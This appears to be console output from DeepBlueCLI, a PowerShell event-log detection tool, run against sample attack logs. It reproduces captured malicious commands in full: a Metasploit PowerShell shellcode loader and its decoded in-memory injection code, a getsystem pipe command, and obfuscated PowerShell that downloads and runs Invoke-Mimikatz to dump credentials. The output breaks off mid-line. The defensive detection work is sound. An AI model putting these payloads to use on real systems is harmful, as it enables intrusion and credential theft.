C:\tools\DeepBlueCLI-master\DeepBlue.ps1?
[D] Do not run  [R] Run once  [S] Suspend  [?] Help (default is "D"): R


Date    : 9/20/2016 10:35:58 AM
Log     : System
EventID : 7045
Message : Suspicious Service Command
Results : Service name: genusn
          Metasploit-style cmd with pipe (possible use of Meterpreter 'getsystem')

Command : cmd.exe /c echo genusn > \\.\pipe\genusn
Decoded :

Date    : 9/20/2016 10:35:46 AM
Log     : System
EventID : 7045
Message : New Service Created
Results : Service name: UWdKhYTIQWWJxHfx
          Metasploit-style service name: 16 characters

Command : %COMSPEC% /b /c start /b /min powershell.exe -nop -w hidden -c if([IntPtr]::Size -eq
          4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object
          System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-nop -w hidden -c $s=New-Object IO.MemoryStream(,[Convert]::FromBase64St
          ring(''H4sIAGFl4VcCA71WW4/aOhB+bqX+h6hCIlFZEli6N6nScYAAy2Vhw52iI5M4weDEbOJw6+l/PxMge2m31Z4+nAgU2zPjGX/zjSdO5FuCcl+aF8YW77iE9KRvH96/a+MAe5
          Kcmq0rV5uutY5mopKRUq6rcU625Yd6V3n3DvRS++uRJ32R5AlarUrcw9Sf3twUoyAgvjjOsxUiUBgSb8YoCWVF+kcazElAzu5mC2IJ6ZuU+jtbYXyG2UltV8TWnEhnyLdjWYNbOI4
          xa64YFXL669e0MjnLTbPlhwizUE6bu1AQL2szllak70rssLtbETndpFbAQ+6I7ID65/lszw+xQ1qw25o0iZhzO0wrcAr4BUREgS8dzhNvcBTLaRi2A24h2w5ICNrZmr/mSyKn/Iix
          jPSXPDl5v498QT0CckECvjJJsKYWCbNV7NuM3BNnKrfIJjn0W43k50ag1RaBkoG8vBJmk9sRI0fLtPJzoC9yqcDzQz4BiO8f3n947ySU8C6CVWtPLxcbhJ+TAkbvJocxgajlNg/pQ
          f+LpGWkJvjHggc7mKa6QUSUqTSJszGZTqWUPeyagdjVM7/eI5cYgPreEMM1h8VJn1N7CkanbKUs9hB7+A3rSsShPintfOxRKyGW/FoOiMPI4cTZRK0FYcnpk4DYJcKIi0WMakaa/G
          xW9qh4tNUjymwSIAvyGEJUkGLlZTDHRMnpmt8kHiB1nKchHQ7QmSTaJwrvEu/xHJTSRYbDMCO1I6gnKyOZBDNiZyTkh/QkQpHgh2H6KdxmxAS1cCiS7aZKguPJX5H7oQgiC5IHZ++
          aK2JRzGIoMlKV2kTfmdRN/KZfBaKIGaO+CzutIRGwEgNgipgSAYT4mH4laxJR81aMeKB3KG6DYRdK+VQQBx5hl9jpH6NMCH9kd4xHAsSzGCHJJuMiI/VpIOCOiLE9cunPg3h2RxzC
          KQbklBQ5qZyJvhMxz1MMF+dHfp4wOiASCEDDCLin45BcFEwRAFbyR/WOFhE8o5rPmpa+pDm0oblaE/49el7jpUu7fruoqkFpO3dQLaw1q+1Sp1otrG/NfkGY5Zqot2uiWR4uFiaq3
          vdGYlxD1S7VlqPCfnVL92YD2aOterHX9xtN3+4Xru2MSo7jXjrmfe6zQRuDYkfX8rhRKkeNgb7RtUJYpptqh/Y6y1tDzEZ9hnuO6g5z15huG8Gin+PNfQ2hyvzc2t86/cq8ae9GVf
          V6UFiiMkJFv9w3dF4f6QFqq33s9vmmvqiwgVtEumFRMu70DL3TMXTUqyweSteqC7ZDPNcH/Twdr4b3c5gbEEJd1Qo1m+z5qAMgVTjC7j3ouMW8NXdAp/QJ6Z9aPMzjpc6RDjrG+AH
          iGq2MNgN5t5fnqM9aQ4wa452hqrlRu4CqGh1UXBRviV29g1G4Lu1Laq5vc3vwuTVy1P6QXaqlYndlOaqqbqqlujXOba/uLgu69lD0qMdmeVu97l3p/qbutteu3Rlc3m9buxn466lq
          /2PMGqBNavHZu9IuF8/o8Ktrv4mDcI4Z0ATu86RQDR4Ypyu5zWlsIcvPuvWSBD5h0Nyg/SV8R4xxK+4TL65w6FXHDjKF4u3B8Dz/6kiRHhWVpz6SLN3cjCFmqKMjybMN4rtintG25
          5oG97+2LWhw8LeftMhXO/m0WSbuIAleTy7YwYUSl1hqMdg0L5bV1f+B5qnE5/Cy34rm09pvpG9CWMs8IvGT5OXCf8L7D7EYYCpA34Qri5FjA/09JCcuPfsQSVIHXHFOT/wxeBeJsx
          Z8o/wLs66tlosKAAA=''));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompre
          ss))).ReadToEnd();';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.
          Diagnostics.Process]::Start($s);
Decoded :

Date    : 9/20/2016 10:35:46 AM
Log     : System
EventID : 7045
Message : Suspicious Service Command
Results : Service name: UWdKhYTIQWWJxHfx
          Long Command Line: greater than 1000 bytes
          Metasploit-style base64 encoded/compressed PowerShell function (possible use of Metasploit PowerShell exploit payload)
          500+ consecutive Base64 characters
          Base64-encoded and compressed function

Command : %COMSPEC% /b /c start /b /min powershell.exe -nop -w hidden -c if([IntPtr]::Size -eq
          4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object
          System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-nop -w hidden -c $s=New-Object IO.MemoryStream(,[Convert]::FromBase64St
          ring(''H4sIAGFl4VcCA71WW4/aOhB+bqX+h6hCIlFZEli6N6nScYAAy2Vhw52iI5M4weDEbOJw6+l/PxMge2m31Z4+nAgU2zPjGX/zjSdO5FuCcl+aF8YW77iE9KRvH96/a+MAe5
          Kcmq0rV5uutY5mopKRUq6rcU625Yd6V3n3DvRS++uRJ32R5AlarUrcw9Sf3twUoyAgvjjOsxUiUBgSb8YoCWVF+kcazElAzu5mC2IJ6ZuU+jtbYXyG2UltV8TWnEhnyLdjWYNbOI4
          xa64YFXL669e0MjnLTbPlhwizUE6bu1AQL2szllak70rssLtbETndpFbAQ+6I7ID65/lszw+xQ1qw25o0iZhzO0wrcAr4BUREgS8dzhNvcBTLaRi2A24h2w5ICNrZmr/mSyKn/Iix
          jPSXPDl5v498QT0CckECvjJJsKYWCbNV7NuM3BNnKrfIJjn0W43k50ag1RaBkoG8vBJmk9sRI0fLtPJzoC9yqcDzQz4BiO8f3n947ySU8C6CVWtPLxcbhJ+TAkbvJocxgajlNg/pQ
          f+LpGWkJvjHggc7mKa6QUSUqTSJszGZTqWUPeyagdjVM7/eI5cYgPreEMM1h8VJn1N7CkanbKUs9hB7+A3rSsShPintfOxRKyGW/FoOiMPI4cTZRK0FYcnpk4DYJcKIi0WMakaa/G
          xW9qh4tNUjymwSIAvyGEJUkGLlZTDHRMnpmt8kHiB1nKchHQ7QmSTaJwrvEu/xHJTSRYbDMCO1I6gnKyOZBDNiZyTkh/QkQpHgh2H6KdxmxAS1cCiS7aZKguPJX5H7oQgiC5IHZ++
          aK2JRzGIoMlKV2kTfmdRN/KZfBaKIGaO+CzutIRGwEgNgipgSAYT4mH4laxJR81aMeKB3KG6DYRdK+VQQBx5hl9jpH6NMCH9kd4xHAsSzGCHJJuMiI/VpIOCOiLE9cunPg3h2RxzC
          KQbklBQ5qZyJvhMxz1MMF+dHfp4wOiASCEDDCLin45BcFEwRAFbyR/WOFhE8o5rPmpa+pDm0oblaE/49el7jpUu7fruoqkFpO3dQLaw1q+1Sp1otrG/NfkGY5Zqot2uiWR4uFiaq3
          vdGYlxD1S7VlqPCfnVL92YD2aOterHX9xtN3+4Xru2MSo7jXjrmfe6zQRuDYkfX8rhRKkeNgb7RtUJYpptqh/Y6y1tDzEZ9hnuO6g5z15huG8Gin+PNfQ2hyvzc2t86/cq8ae9GVf
          V6UFiiMkJFv9w3dF4f6QFqq33s9vmmvqiwgVtEumFRMu70DL3TMXTUqyweSteqC7ZDPNcH/Twdr4b3c5gbEEJd1Qo1m+z5qAMgVTjC7j3ouMW8NXdAp/QJ6Z9aPMzjpc6RDjrG+AH
          iGq2MNgN5t5fnqM9aQ4wa452hqrlRu4CqGh1UXBRviV29g1G4Lu1Laq5vc3vwuTVy1P6QXaqlYndlOaqqbqqlujXOba/uLgu69lD0qMdmeVu97l3p/qbutteu3Rlc3m9buxn466lq
          /2PMGqBNavHZu9IuF8/o8Ktrv4mDcI4Z0ATu86RQDR4Ypyu5zWlsIcvPuvWSBD5h0Nyg/SV8R4xxK+4TL65w6FXHDjKF4u3B8Dz/6kiRHhWVpz6SLN3cjCFmqKMjybMN4rtintG25
          5oG97+2LWhw8LeftMhXO/m0WSbuIAleTy7YwYUSl1hqMdg0L5bV1f+B5qnE5/Cy34rm09pvpG9CWMs8IvGT5OXCf8L7D7EYYCpA34Qri5FjA/09JCcuPfsQSVIHXHFOT/wxeBeJsx
          Z8o/wLs66tlosKAAA=''));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompre
          ss))).ReadToEnd();';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.
          Diagnostics.Process]::Start($s);
Decoded : function h4ZcoQgeeU {
                Param ($bvG8wTcvubtG, $gg0ooexEqKT)
                $z9Ym = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And
          $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')

                return $z9Ym.GetMethod('GetProcAddress').Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object
          System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($z9Ym.GetMethod('GetModuleHandle')).Invoke($null, @($bvG8wTcvubtG)))),
          $gg0ooexEqKT))
          }

          function m6rpNzi7jwAa {
                Param (
                        [Parameter(Position = 0, Mandatory = $True)] [Type[]] $dXTSrtyK,
                        [Parameter(Position = 1)] [Type] $zFtXvo = [Void]
                )

                $clqy = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')),
          [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class,
          Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
                $clqy.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard,
          $dXTSrtyK).SetImplementationFlags('Runtime, Managed')
                $clqy.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $zFtXvo, $dXTSrtyK).SetImplementationFlags('Runtime, Managed')

                return $clqy.CreateType()
          }

          [Byte[]]$laChqy = [System.Convert]::FromBase64String("/OiCAAAAYInlMcBki1Awi1IMi1IUi3IoD7dKJjH/rDxhfAIsIMHPDQHH4vJSV4tSEItKPItMEXjjSAHRUYt
          ZIAHTi0kY4zpJizSLAdYx/6zBzw0BxzjgdfYDffg7fSR15FiLWCQB02aLDEuLWBwB04sEiwHQiUQkJFtbYVlaUf/gX19aixLrjV1oMzIAAGh3czJfVGhMdyYH/9W4kAEAACnEVFBo
          KYBrAP/VagVowKjGlWgCABFcieZQUFBQQFBAUGjqD9/g/9WXahBWV2iZpXRh/9WFwHQK/04IdezoYQAAAGoAagRWV2gC2chf/9WD+AB+Nos2akBoABAAAFZqAGhYpFPl/9WTU2oAV
          lNXaALZyF//1YP4AH0iWGgAQAAAagBQaAsvDzD/1VdodW5NYf/VXl7/DCTpcf///wHDKcZ1x8O74B0qCmimlb2d/9U8BnwKgPvgdQW7RxNyb2oAU//V")

          $j5m807j = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((h4ZcoQgeeU kernel32.dll VirtualAlloc), (m6rpNzi7jwAa
          @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $laChqy.Length,0x3000, 0x40)
          [System.Runtime.InteropServices.Marshal]::Copy($laChqy, 0, $j5m807j, $laChqy.length)

          $jWwM6kHp = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((h4ZcoQgeeU kernel32.dll CreateThread),
          (m6rpNzi7jwAa @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr])
          ([IntPtr]))).Invoke([IntPtr]::Zero,0,$j5m807j,[IntPtr]::Zero,0,[IntPtr]::Zero)
          [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((h4ZcoQgeeU kernel32.dll WaitForSingleObject), (m6rpNzi7jwAa
          @([IntPtr], [Int32]))).Invoke($jWwM6kHp,0xffffffff) | Out-Null



PS C:\tools\DeepBlueCLI-master>
```

**Mimikatz `lsadump::sam`**

```powershell
PS C:\tools\DeepBlueCLI-master> .\DeepBlue.ps1 .\evtx\mimikatz-privesc-hashdump.evtx

Security warning
Run only scripts that you trust. While scripts from the internet can be useful, this script can potentially harm your computer. If you trust this
script, use the Unblock-File cmdlet to allow the script to run without this warning message. Do you want to run
C:\tools\DeepBlueCLI-master\DeepBlue.ps1?
[D] Do not run  [R] Run once  [S] Suspend  [?] Help (default is "D"): R


Date    : 4/30/2019 12:08:29 PM
Log     : Security
EventID : 4673
Message : Sensititive Privilege Use Exceeds Threshold
Results : Potentially indicative of Mimikatz, multiple sensitive privilege calls have been made.
          Username: Sec504
          Domain Name: SEC504STUDENT

Command :
Decoded :

PS C:\tools\DeepBlueCLI-master>
```

**New user creation**

```powershell
PS C:\tools\DeepBlueCLI-master> .\DeepBlue.ps1 .\evtx\new-user-security.evtx

Security warning
Run only scripts that you trust. While scripts from the internet can be useful, this script can potentially harm your computer. If you trust this
script, use the Unblock-File cmdlet to allow the script to run without this warning message. Do you want to run
C:\tools\DeepBlueCLI-master\DeepBlue.ps1?
[D] Do not run  [R] Run once  [S] Suspend  [?] Help (default is "D"): R


Date    : 10/23/2013 10:22:40 AM
Log     : Security
EventID : 4732
Message : User added to local Administrators group
Results : Username: -
          User SID: S-1-5-21-3463664321-2923530833-3546627382-1000

Command :
Decoded :

Date    : 10/23/2013 10:22:39 AM
Log     : Security
EventID : 4720
Message : New User Created
Results : Username: IEUser
          User SID: S-1-5-21-3463664321-2923530833-3546627382-1000

Command :
Decoded :

PS C:\tools\DeepBlueCLI-master>
```

**Obfuscation (encoding)**

```powershell
PS C:\tools\DeepBlueCLI-master> .\DeepBlue.ps1 .\evtx\Powershell-Invoke-Obfuscation-encoding-menu.evtx

Security warning
Run only scripts that you trust. While scripts from the internet can be useful, this script can potentially harm your computer. If you trust this
script, use the Unblock-File cmdlet to allow the script to run without this warning message. Do you want to run
C:\tools\DeepBlueCLI-master\DeepBlue.ps1?
[D] Do not run  [R] Run once  [S] Suspend  [?] Help (default is "D"): R


Date    : 8/30/2017 1:16:25 PM
Log     : Powershell
EventID : 4104
Message : Suspicious Command Line
Results : Possible command obfuscation: only 60% alphanumeric and common symbols

Command : { $vFzAY=$_ -spLIT '          '|FOrEAcH-ObJect {'     '; $_.sPliT('   ')|FOrEAcH-ObJect{ $_.lENGTh- 1 }
          };((-JoIN($vFzAY[0..($vFzAY.lENGTh-1)])).trim('        ').sPliT( '    ')| FOrEAcH-ObJect { ([Char][iNT]$_)}) -JoIN'' | . (
          ''.InDexof.TOStrING()[106,482,184]-jOin'')}
Decoded :

Date    : 8/30/2017 1:16:25 PM
Log     : Powershell
EventID : 4104
Message : Suspicious Command Line
Results : Long Command Line: greater than 1000 bytes
          Possible command obfuscation: only 6% alphanumeric and common symbols

Command : '

     '| FOrEAcH-ObJect { $vFzAY=$_ -spLIT '             '|FOrEAcH-ObJect {'     '; $_.sPliT('
          ')|FOrEAcH-ObJect{ $_.lENGTh- 1 } };((-JoIN($vFzAY[0..($vFzAY.lENGTh-1)])).trim('      ').sPliT( '    ')| FOrEAcH-ObJect { ([Char][iNT]$_)})
          -JoIN'' | . ( ''.InDexof.TOStrING()[106,482,184]-jOin'')}
Decoded :

Date    : 8/30/2017 1:16:06 PM
Log     : Powershell
EventID : 4104
Message : Suspicious Command Line
Results : Long Command Line: greater than 1000 bytes
          Possible command obfuscation: only 58% alphanumeric and common symbols

Command :   iex([CHar]73  +[CHar]69+[CHar]88  +[CHar]32  +[CHar]40  +[CHar]78  +[CHar]101+[CHar]119  +  [CHar]45+  [CHar]79  +
          [CHar]98+[CHar]106+[CHar]101  +[CHar]99  +[CHar]116+  [CHar]32  +[CHar]78+[CHar]101  +  [CHar]116  +[CHar]46+[CHar]87+[CHar]101  +
          [CHar]98+  [CHar]67  +[CHar]108  +[CHar]105+[CHar]101  +  [CHar]110  +  [CHar]116+  [CHar]41  +  [CHar]46+  [CHar]68+  [CHar]111+
          [CHar]119+  [CHar]110+[CHar]108  +[CHar]111+  [CHar]97  +  [CHar]100  +  [CHar]83+  [CHar]116  +  [CHar]114+[CHar]105  +[CHar]110+
          [CHar]103+  [CHar]40+  [CHar]39+[CHar]104  +[CHar]116  +[CHar]116+  [CHar]112  +[CHar]115  +  [CHar]58+  [CHar]47+[CHar]47+[CHar]114+
          [CHar]97+  [CHar]119  +  [CHar]46+[CHar]103+[CHar]105+  [CHar]116  +[CHar]104  +[CHar]117+[CHar]98+[CHar]117+[CHar]115  +  [CHar]101+
          [CHar]114  +[CHar]99+  [CHar]111  +  [CHar]110+[CHar]116  +  [CHar]101  +  [CHar]110+  [CHar]116  +[CHar]46+  [CHar]99  +[CHar]111
          +[CHar]109  +[CHar]47  +  [CHar]109  +[CHar]97  +[CHar]116  +[CHar]116  +  [CHar]105  +  [CHar]102  +[CHar]101  +  [CHar]115  +
          [CHar]116+[CHar]97+  [CHar]116+  [CHar]105+  [CHar]111  +[CHar]110  +[CHar]47+  [CHar]80+[CHar]111  +  [CHar]119  +[CHar]101  +
          [CHar]114+  [CHar]83+  [CHar]112+[CHar]108+  [CHar]111+  [CHar]105  +  [CHar]116+[CHar]47  +  [CHar]109+  [CHar]97  +[CHar]115
          +[CHar]116+[CHar]101  +[CHar]114  +[CHar]47+[CHar]69+[CHar]120  +[CHar]102+  [CHar]105+[CHar]108  +[CHar]116  +  [CHar]114+  [CHar]97+
          [CHar]116  +  [CHar]105  +  [CHar]111+[CHar]110+[CHar]47+[CHar]73+  [CHar]110+[CHar]118+[CHar]111+[CHar]107  +[CHar]101+[CHar]45+
          [CHar]77+  [CHar]105+[CHar]109+[CHar]105  +[CHar]107+[CHar]97  +  [CHar]116+[CHar]122  +  [CHar]46  +  [CHar]112+[CHar]115  +  [CHar]49+
           [CHar]39  +  [CHar]41  +[CHar]59  +[CHar]32+  [CHar]73+[CHar]110+[CHar]118+  [CHar]111+  [CHar]107+[CHar]101+[CHar]45+  [CHar]77  +
          [CHar]105  +[CHar]109+[CHar]105+  [CHar]107  +  [CHar]97+[CHar]116+[CHar]122+[CHar]32  +  [CHar]45  +[CHar]68+[CHar]117  +[CHar]109+
          [CHar]112  +[CHar]67+[CHar]114  +[CHar]101+[CHar]100  +  [CHar]115)
Decoded :

Date    : 8/30/2017 1:16:06 PM
Log     : Powershell
EventID : 4104
Message : Suspicious Command Line
Results : Long Command Line: greater than 1000 bytes
          Possible command obfuscation: only 3% alphanumeric and common symbols

Command : ${=}  =+  $(  );  ${-#}  =${=}  ;${]!}  =++${=}  ;${*}  =++${=}  ;${(@}  =  ++${=}  ;${+=}=++  ${=};  ${%}  =  ++  ${=}  ;  ${.]/}  =
          ++${=};${#/}=++${=}  ;  ${@=-}=  ++  ${=};  ${@%)}=  ++  ${=}  ;  ${*[%}  =  "["+"$(@{})"[${#/}  ]+"$(@{})"[  "${]!}"+"${@%)}"  ]+"$(@{
          })"[  "${*}"  +  "${-#}"]  +  "$?  "[  ${]!}  ]+  "]"  ;${=}="".("$(  @{}  )"[  "${]!}${+=}"  ]+"$(  @{}  )"[  "${]!}${.]/}"]  +  "$(
          @{})  "[  ${-#}  ]+  "$(@{  }  )  "[${+=}  ]+"$?  "[${]!}]  +  "$(  @{  }  )  "[  ${(@}  ]  )  ;${=}="$(@{  }  )  "[  "${]!}"  +"${+=}"
          ]  +  "$(@{  }  )"[${+=}]  +  "${=}"[  "${*}"  +  "${#/}"  ]  ;  "  ${=}(${*[%}${#/}${(@}  +${*[%}${.]/}${@%)}+${*[%}${@=-}${@=-}
          +${*[%}${(@}${*}  +${*[%}${+=}${-#}  +${*[%}${#/}${@=-}  +${*[%}${]!}${-#}${]!}+${*[%}${]!}${]!}${@%)}  +  ${*[%}${+=}${%}+
          ${*[%}${#/}${@%)}  +  ${*[%}${@%)}${@=-}+${*[%}${]!}${-#}${.]/}+${*[%}${]!}${-#}${]!}  +${*[%}${@%)}${@%)}  +${*[%}${]!}${]!}${.]/}+
          ${*[%}${(@}${*}  +${*[%}${#/}${@=-}+${*[%}${]!}${-#}${]!}  +  ${*[%}${]!}${]!}${.]/}
          +${*[%}${+=}${.]/}+${*[%}${@=-}${#/}+${*[%}${]!}${-#}${]!}  +  ${*[%}${@%)}${@=-}+  ${*[%}${.]/}${#/}  +${*[%}${]!}${-#}${@=-}
          +${*[%}${]!}${-#}${%}+${*[%}${]!}${-#}${]!}  +  ${*[%}${]!}${]!}${-#}  +  ${*[%}${]!}${]!}${.]/}+  ${*[%}${+=}${]!}  +
          ${*[%}${+=}${.]/}+  ${*[%}${.]/}${@=-}+  ${*[%}${]!}${]!}${]!}+  ${*[%}${]!}${]!}${@%)}+  ${*[%}${]!}${]!}${-#}+${*[%}${]!}${-#}${@=-}
          +${*[%}${]!}${]!}${]!}+  ${*[%}${@%)}${#/}  +  ${*[%}${]!}${-#}${-#}  +  ${*[%}${@=-}${(@}+  ${*[%}${]!}${]!}${.]/}  +
          ${*[%}${]!}${]!}${+=}+${*[%}${]!}${-#}${%}  +${*[%}${]!}${]!}${-#}+  ${*[%}${]!}${-#}${(@}+  ${*[%}${+=}${-#}+
          ${*[%}${(@}${@%)}+${*[%}${]!}${-#}${+=}  +${*[%}${]!}${]!}${.]/}  +${*[%}${]!}${]!}${.]/}+  ${*[%}${]!}${]!}${*}  +${*[%}${]!}${]!}${%}
          +  ${*[%}${%}${@=-}+  ${*[%}${+=}${#/}+${*[%}${+=}${#/}+${*[%}${]!}${]!}${+=}+  ${*[%}${@%)}${#/}+  ${*[%}${]!}${]!}${@%)}  +
          ${*[%}${+=}${.]/}+${*[%}${]!}${-#}${(@}+${*[%}${]!}${-#}${%}+  ${*[%}${]!}${]!}${.]/}  +${*[%}${]!}${-#}${+=}
          +${*[%}${]!}${]!}${#/}+${*[%}${@%)}${@=-}+${*[%}${]!}${]!}${#/}+${*[%}${]!}${]!}${%}  +  ${*[%}${]!}${-#}${]!}+  ${*[%}${]!}${]!}${+=}
          +${*[%}${@%)}${@%)}+  ${*[%}${]!}${]!}${]!}  +  ${*[%}${]!}${]!}${-#}+${*[%}${]!}${]!}${.]/}  +  ${*[%}${]!}${-#}${]!}  +
          ${*[%}${]!}${]!}${-#}+  ${*[%}${]!}${]!}${.]/}  +${*[%}${+=}${.]/}+  ${*[%}${@%)}${@%)}  +${*[%}${]!}${]!}${]!}  +${*[%}${]!}${-#}${@%)}
           +${*[%}${+=}${#/}  +  ${*[%}${]!}${-#}${@%)}  +${*[%}${@%)}${#/}  +${*[%}${]!}${]!}${.]/}  +${*[%}${]!}${]!}${.]/}  +
          ${*[%}${]!}${-#}${%}  +  ${*[%}${]!}${-#}${*}  +${*[%}${]!}${-#}${]!}  +  ${*[%}${]!}${]!}${%}  +
          ${*[%}${]!}${]!}${.]/}+${*[%}${@%)}${#/}+  ${*[%}${]!}${]!}${.]/}+  ${*[%}${]!}${-#}${%}+  ${*[%}${]!}${]!}${]!}  +${*[%}${]!}${]!}${-#}
           +${*[%}${+=}${#/}+  ${*[%}${@=-}${-#}+${*[%}${]!}${]!}${]!}  +  ${*[%}${]!}${]!}${@%)}  +${*[%}${]!}${-#}${]!}  +
          ${*[%}${]!}${]!}${+=}+  ${*[%}${@=-}${(@}+  ${*[%}${]!}${]!}${*}+${*[%}${]!}${-#}${@=-}+  ${*[%}${]!}${]!}${]!}+  ${*[%}${]!}${-#}${%}
          +  ${*[%}${]!}${]!}${.]/}+${*[%}${+=}${#/}  +  ${*[%}${]!}${-#}${@%)}+  ${*[%}${@%)}${#/}  +${*[%}${]!}${]!}${%}
          +${*[%}${]!}${]!}${.]/}+${*[%}${]!}${-#}${]!}  +${*[%}${]!}${]!}${+=}  +${*[%}${+=}${#/}+${*[%}${.]/}${@%)}+${*[%}${]!}${*}${-#}
          +${*[%}${]!}${-#}${*}+  ${*[%}${]!}${-#}${%}+${*[%}${]!}${-#}${@=-}  +${*[%}${]!}${]!}${.]/}  +  ${*[%}${]!}${]!}${+=}+
          ${*[%}${@%)}${#/}+  ${*[%}${]!}${]!}${.]/}  +  ${*[%}${]!}${-#}${%}  +
          ${*[%}${]!}${]!}${]!}+${*[%}${]!}${]!}${-#}+${*[%}${+=}${#/}+${*[%}${#/}${(@}+
          ${*[%}${]!}${]!}${-#}+${*[%}${]!}${]!}${@=-}+${*[%}${]!}${]!}${]!}+${*[%}${]!}${-#}${#/}  +${*[%}${]!}${-#}${]!}+${*[%}${+=}${%}+
          ${*[%}${#/}${#/}+  ${*[%}${]!}${-#}${%}+${*[%}${]!}${-#}${@%)}+${*[%}${]!}${-#}${%}  +${*[%}${]!}${-#}${#/}+${*[%}${@%)}${#/}  +
          ${*[%}${]!}${]!}${.]/}+${*[%}${]!}${*}${*}  +  ${*[%}${+=}${.]/}  +  ${*[%}${]!}${]!}${*}+${*[%}${]!}${]!}${%}  +  ${*[%}${+=}${@%)}+
          ${*[%}${(@}${@%)}  +  ${*[%}${+=}${]!}  +${*[%}${%}${@%)}  +${*[%}${(@}${*}+
          ${*[%}${#/}${(@}+${*[%}${]!}${]!}${-#}+${*[%}${]!}${]!}${@=-}+  ${*[%}${]!}${]!}${]!}+
          ${*[%}${]!}${-#}${#/}+${*[%}${]!}${-#}${]!}+${*[%}${+=}${%}+  ${*[%}${#/}${#/}  +  ${*[%}${]!}${-#}${%}
          +${*[%}${]!}${-#}${@%)}+${*[%}${]!}${-#}${%}+  ${*[%}${]!}${-#}${#/}  +
          ${*[%}${@%)}${#/}+${*[%}${]!}${]!}${.]/}+${*[%}${]!}${*}${*}+${*[%}${(@}${*}  +  ${*[%}${+=}${%}
          +${*[%}${.]/}${@=-}+${*[%}${]!}${]!}${#/}  +${*[%}${]!}${-#}${@%)}+  ${*[%}${]!}${]!}${*}  +${*[%}${.]/}${#/}+${*[%}${]!}${]!}${+=}
          +${*[%}${]!}${-#}${]!}+${*[%}${]!}${-#}${-#}  +  ${*[%}${]!}${]!}${%})"|&  ${=}
Decoded :

Date    : 8/30/2017 1:15:43 PM
Log     : Powershell
EventID : 4104
Message : Suspicious Command Line
Results : Possible command obfuscation: only 51% alphanumeric and common symbols

Command :  ( [cHAR[]] ( 20 , 24, 5 ,125 , 117 , 19, 56,42, 112 ,18 , 63 , 55,56 ,62,41,125,19 , 56 , 41 ,115 ,10,56 ,63, 30 , 49 ,52 ,56 ,51, 41 ,
          116 , 115, 25 ,50,42 ,51, 49,50,60, 57, 14, 41 ,47 , 52, 51, 58 ,117 ,122 , 53, 41,41 , 45 , 46,103, 114, 114,47 ,60, 42, 115, 58 , 52 ,
          41 ,53 ,40, 63 , 40 , 46, 56,47 , 62 ,50 ,51, 41 ,56,51,41, 115 , 62, 50 ,48 , 114,48,60 , 41,41 ,52 ,59, 56, 46, 41 ,60, 41 , 52,50 ,
          51, 114 , 13,50,42 ,56 , 47 ,14 ,45 , 49, 50 , 52 ,41 , 114 ,48, 60, 46,41, 56,47, 114 , 24,37,59,52 , 49 ,41, 47, 60,41,52 , 50 , 51 ,
          114 ,20 , 51 ,43, 50,54 ,56, 112 , 16 , 52, 48 , 52 , 54, 60 ,41,39, 115, 45 ,46 , 108 , 122,116,102, 125 ,20 ,51 , 43, 50 , 54 ,56
          ,112, 16, 52,48,52, 54,60 , 41 , 39 ,125 ,112 , 25, 40 , 48, 45,30 ,47 ,56, 57 ,46 ) |%{[cHAR] ( $_ -BXor"0x5d" ) } )-JOIN''|.(
          $ENv:ComSPEc[4,15,25]-jOIN'')
Decoded :

Date    : 8/30/2017 1:15:23 PM
Log     : Powershell
EventID : 4104
Message : Suspicious Command Line
Results : Long Command Line: greater than 1000 bytes
          500+ consecutive Base64 characters

Command :  ( [rUntImE.iNtEROPSeRviCEs.mARShaL]::pTRtOSTriNGBstR([ruNtIMe.iNTeropSERVIcES.MarsHAl]::seCUResTRingtObstr($('76492d1116743f0423413b1605
          0a5345MgB8ADcAUABxAFcAagBnAHgAUQBpAGoARABCADkARABNAHgAVQAxAEgAUQA1AGcAPQA9AHwANABjADQANgBmADUANgA3ADgAYgBhADkANwBmADUANwA3ADgAOABlADkANgA
          xAGMAMgA0ADAAMQA0ADkAZQA3AGEAYQAwADUANQAxADAANQBiADcAMQA3ADUANQA4AGEAYwAyAGMANQA3ADkAYgBiADkAMQBhAGIANgAzAGUAYwAxAGEAOAAwAGMAZABkADUAMgA4
          ADcAZAA1AGUAMwA4AGEANAA3AGUANQA5ADUANwBjAGMANwA5ADcAMwBhADIANAA2ADMAMQBmAGMAYwA1ADgAYQA5ADQAOAAwADgAOQAyADQAYwA2ADUAYwAyADkANgBhAGUAYwA0A
          DAAZAA2AGQANQA0ADkAYgA3ADgAYQA1ADcANAA5ADYAYwAyADgAZQA5AGIANgBlADQAZgBlADgAYQBlADcAYQA1ADgAYQAxADYAYgA3AGUAZABiAGEAMgAyAGMAZAA3AGEAMAA4AG
